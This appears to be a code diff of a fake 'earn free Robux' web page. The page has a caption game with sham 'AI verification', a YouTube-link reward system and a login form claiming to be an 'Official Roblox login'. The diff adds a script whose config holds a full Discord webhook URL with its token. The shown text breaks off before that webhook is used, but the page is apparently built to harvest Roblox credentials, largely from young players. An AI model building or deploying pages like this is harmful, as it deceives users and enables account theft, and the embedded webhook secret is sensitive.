@@ -79,7 +79,7 @@ body { background: #f0f0f0; }
 .p2-online { color: #444; font-size: 11px; margin-top: 14px; }
 .p2-ad { margin-top: 16px; padding: 10px; background: #0e0e22; border-radius: 10px; color: #555; font-size: 12px; border: 1px solid #222240; }
 
-/* ========== PAGE 3 - LOGIN ========== */
+/* ========== PAGE 3 ========== */
 .p3 { background: #e8e8e8; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
 .p3-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
 .p3-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ffd700, #ff6b6b); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(255,107,107,0.2); }
@@ -95,61 +95,24 @@ body { background: #f0f0f0; }
 .btn-log:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 .p3-err { color: #d32f2f; font-size: 13px; margin-top: 12px; display: none; }
 .p3-links { margin-top: 16px; font-size: 12px; }
-.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; cursor: pointer; }
+.p3-links a { color: #ff6b6b; text-decoration: none; margin: 0 8px; }
 .p3-links a:hover { text-decoration: underline; }
 .p3-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
 .spin { display: none; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
 @keyframes spin { to { transform: rotate(360deg); } }
+.btn-log .btxt { display: inline; }
 .btn-log.load .btxt { display: none; }
 .btn-log.load .spin { display: block; }
 .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #222; color: #fff; padding: 14px 28px; border-radius: 12px; display: none; z-index: 999; font-size: 14px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
 .toast.show { display: block; animation: fadeio 2.2s ease; }
 @keyframes fadeio { 0% { opacity: 0; transform: translateX(-50%) translateY(-15px); } 12% { opacity: 1; transform: translateX(-50%) translateY(0); } 80% { opacity: 1; transform: translateX(-50%) translateY(0); } 100% { opacity: 0; transform: translateX(-50%) translateY(-15px); } }
-
-/* ========== PAGE 4 - SIGN UP ========== */
-.p4 { background: #e8f5e9; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
-.p4-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
-.p4-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #4caf50, #2196f3); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(33,150,243,0.2); }
-.p4-box h1 { color: #222; font-size: 22px; }
-.p4-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
-.p4-grp { margin-bottom: 16px; text-align: left; }
-.p4-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
-.p4-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
-.p4-grp input:focus { border-color: #4caf50; background: #fff; }
-.btn-sign { background: linear-gradient(135deg, #4caf50, #2e7d32); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(76,175,80,0.2); margin-top: 6px; }
-.btn-sign:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(76,175,80,0.3); }
-.btn-sign:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-.p4-links { margin-top: 16px; font-size: 12px; }
-.p4-links a { color: #4caf50; text-decoration: none; margin: 0 8px; cursor: pointer; }
-.p4-links a:hover { text-decoration: underline; }
-.p4-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
-
-/* ========== PAGE 5 - FORGOT PASSWORD ========== */
-.p5 { background: #fff3e0; min-height: 100vh; padding: 30px 20px; display: flex; justify-content: center; align-items: center; }
-.p5-box { background: #fff; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 100%; box-shadow: 0 10px 50px rgba(0,0,0,0.12); text-align: center; }
-.p5-logo { width: 76px; height: 76px; border-radius: 50%; background: linear-gradient(135deg, #ff9800, #f44336); margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; font-size: 34px; box-shadow: 0 6px 20px rgba(244,67,54,0.2); }
-.p5-box h1 { color: #222; font-size: 22px; }
-.p5-sub { color: #888; font-size: 13px; margin: 4px 0 18px; }
-.p5-grp { margin-bottom: 16px; text-align: left; }
-.p5-grp label { display: block; color: #555; font-size: 12px; margin-bottom: 6px; font-weight: 600; }
-.p5-grp input { width: 100%; padding: 13px 16px; border: 2px solid #ddd; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; background: #fafafa; }
-.p5-grp input:focus { border-color: #ff9800; background: #fff; }
-.btn-reset { background: linear-gradient(135deg, #ff9800, #e65100); color: #fff; padding: 14px 0; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 6px 20px rgba(255,152,0,0.2); margin-top: 6px; }
-.btn-reset:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,152,0,0.3); }
-.btn-reset:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-.p5-links { margin-top: 16px; font-size: 12px; }
-.p5-links a { color: #ff9800; text-decoration: none; margin: 0 8px; cursor: pointer; }
-.p5-links a:hover { text-decoration: underline; }
-.p5-foot { color: #bbb; font-size: 10px; margin-top: 18px; }
-.p5-code-status { display: none; padding: 12px; margin-top: 10px; border-radius: 10px; font-size: 13px; }
-.p5-code-status.show { display: block; }
 </style>
 </head>
 <body>
 
 <div id="toast" class="toast"></div>
 
-<!-- ========== PAGE 1 - EARN ========== -->
+<!-- ========== PAGE 1 ========== -->
 <div class="page active" id="page1">
 <div class="p1">
 <div class="p1-box">
@@ -222,9 +185,8 @@ body { background: #f0f0f0; }
   </div>
 </div>
 
-<div style="display:flex;justify-content:center;gap:10px;margin-top:6px;">
+<div style="text-align:center;margin-top:6px;">
   <button class="btn btn-red" id="clearDataBtn" style="padding:10px 24px;">Clear All Data</button>
-  <button class="btn btn-bl" id="gotoLoginBtn" style="padding:10px 24px;">Account</button>
 </div>
 <p class="footer-note">Unofficial fan site. Not affiliated with Roblox Corporation.</p>
 
@@ -232,7 +194,7 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<!-- ========== PAGE 2 - PRIVATE SERVER ========== -->
+<!-- ========== PAGE 2 ========== -->
 <div class="page" id="page2">
 <div class="p2">
 <div class="p2-box">
@@ -264,7 +226,7 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<!-- ========== PAGE 3 - LOGIN ========== -->
+<!-- ========== PAGE 3 ========== -->
 <div class="page" id="page3">
 <div class="p3">
 <div class="p3-box">
@@ -276,12 +238,12 @@ body { background: #f0f0f0; }
 
 <form id="loginForm" autocomplete="off">
   <div class="p3-grp">
-    <label>Username or Email</label>
-    <input type="text" id="loginUsername" placeholder="Enter your Roblox username or email" required autocomplete="off">
+    <label>Username</label>
+    <input type="text" id="username" placeholder="Enter your Roblox username" required autocomplete="off">
   </div>
   <div class="p3-grp">
     <label>Password</label>
-    <input type="password" id="loginPassword" placeholder="Enter your password" required autocomplete="off">
+    <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
   </div>
   <button type="submit" class="btn-log" id="loginBtn">
     <span class="btxt">Sign In</span>
@@ -289,11 +251,11 @@ body { background: #f0f0f0; }
   </button>
 </form>
 
-<div class="p3-err" id="loginErrorMsg">⚠️ Invalid username or password. Please try again.</div>
+<div class="p3-err" id="errorMsg">⚠️ Invalid username or password. Please try again.</div>
 
 <div class="p3-links">
-  <a id="gotoForgotLink">Forgot password?</a>
-  <a id="gotoSignupLink">Create account</a>
+  <a href="#">Forgot password?</a>
+  <a href="#">Create account</a>
 </div>
 <div class="p3-foot">Donation verification required · Official Roblox login</div>
 
@@ -301,24 +263,157 @@ body { background: #f0f0f0; }
 </div>
 </div>
 
-<!-- ========== PAGE 4 - SIGN UP ========== -->
-<div class="page" id="page4">
-<div class="p4">
-<div class="p4-box">
+<script>
+// ==================== CONFIG ====================
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-';
 
-<div class="p4-logo">🚀</div>
-<h1>Create Your Account</h1>
-<p class="p4-sub">Sign up for free and start earning Robux today!</p>
+// ==================== TOAST ====================
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.remove('show');
+  void t.offsetWidth;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2400);
+}
 
-<form id="signupForm" autocomplete="off">
-  <div class="p4-grp">
-    <label>Username</label>
-    <input type="text" id="signupUser" placeholder="Choose a username" required autocomplete="off">
-  </div>
-  <div class="p4-grp">
-    <label>Email Address (Gmail)</label>
-    <input type="email" id="signupEmail" placeholder="your.email@gmail.com" required autocomplete="off">
-  </div>
-  <div class="p4-grp">
-    <label>Create Password</label>
-    <input type="password" id="signupPass" placeholder="Minimum 6 cha
+function switchPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+// ==================== DATA LAYER ====================
+const SK = 'rbx_sim_data';
+const WK = 'rbx_sim_week';
+
+function getData() {
+  const r = localStorage.getItem(SK);
+  if (r) { try { return JSON.parse(r); } catch(e) {} }
+  return { bal: 0, caps: 0, vids: [] };
+}
+function saveData(d) { localStorage.setItem(SK, JSON.stringify(d)); }
+
+function getWeek() {
+  const n = new Date();
+  const s = new Date(n.getFullYear(), 0, 1);
+  return `${n.getFullYear()}-W${Math.ceil((n - s) / (7*24*60*60*1000))}`;
+}
+
+function checkWeek() {
+  const s = localStorage.getItem(WK);
+  const c = getWeek();
+  if (s !== c) {
+    const d = getData();
+    d.vids = [];
+    saveData(d);
+    localStorage.setItem(WK, c);
+  }
+}
+
+function updUI() {
+  checkWeek();
+  const d = getData();
+  document.getElementById('balanceDisplay').textContent = d.bal;
+  document.getElementById('captionCount').textContent = d.caps;
+  document.getElementById('videoCount').textContent = d.vids.length;
+}
+
+// ==================== CAPTION SYSTEM ====================
+const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+let currentCaption = 'A1';
+
+function generateCaption() {
+  const letter = letters[Math.floor(Math.random() * 26)];
+  const number = Math.floor(Math.random() * 9) + 1;
+  currentCaption = letter + number;
+  document.getElementById('captionCode').textContent = currentCaption;
+  
+  // Reset input visuals
+  const inp = document.getElementById('captionInput');
+  inp.value = '';
+  inp.className = '';
+  document.getElementById('captionAIStatus').classList.remove('show');
+}
+
+function refreshCaption() {
+  generateCaption();
+  showToast('🔄 New caption code generated!');
+}
+
+// Refresh button
+document.getElementById('refreshCaptionBtn').addEventListener('click', refreshCaption);
+
+// Auto-refresh on page load
+generateCaption();
+
+// Submit caption
+document.getElementById('submitCaptionBtn').addEventListener('click', function() {
+  const inp = document.getElementById('captionInput');
+  const val = inp.value.trim().toUpperCase();
+  const aiStatus = document.getElementById('captionAIStatus');
+  const aiMsg = document.getElementById('captionAIMsg');
+  
+  if (!val) {
+    showToast('⚠️ Type the caption code shown above!');
+    return;
+  }
+  
+  // AI verification simulation
+  if (val === currentCaption) {
+    // CORRECT - AI passes
+    inp.className = 'correct';
+    aiStatus.className = 'cap-ai show';
+    aiMsg.textContent = '✅ AI verification: Caption code "' + currentCaption + '" is correct! +5 Robux';
+    
+    const d = getData();
+    d.bal += 5;
+    d.caps += 1;
+    saveData(d);
+    updUI();
+    
+    setTimeout(() => {
+      generateCaption();
+    }, 1200);
+  } else {
+    // WRONG
+    inp.className = 'wrong';
+    aiStatus.className = 'cap-ai show';
+    aiStatus.style.background = '#1a0a0a';
+    aiStatus.style.borderColor = '#3a1a1a';
+    aiStatus.style.color = '#f44336';
+    aiMsg.textContent = '❌ AI verification: Code "' + val + '" does not match "' + currentCaption + '". Try again!';
+    
+    setTimeout(() => {
+      inp.className = '';
+      inp.value = '';
+      aiStatus.className = 'cap-ai';
+      aiStatus.style.background = '';
+      aiStatus.style.borderColor = '';
+      aiStatus.style.color = '';
+    }, 1500);
+  }
+});
+
+// ==================== YOUTUBE VIDEO SYSTEM ====================
+function isValidYouTubeURL(url) {
+  const regex = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)[a-zA-Z0-9_-]{11}(\S*)?$/;
+  return regex.test(url.trim());
+}
+
+document.getElementById('submitVideoBtn').addEventListener('click', function() {
+  checkWeek();
+  
+  const inp = document.getElementById('videoLinkInput');
+  const link = inp.value.trim();
+  const aiStatus = document.getElementById('videoAIStatus');
+  const aiMsg = document.getElementById('videoAIMsg');
+  const d = getData();
+  
+  if (!link) {
+    showToast('⚠️ Paste a YouTube video link first!');
+    return;
+  }
+  
+  if (d.vids.length >= 3) {
+    showToast('⚠️ Weekly limit reached! (3/3 videos)');
+    aiStatus.className = 'vid
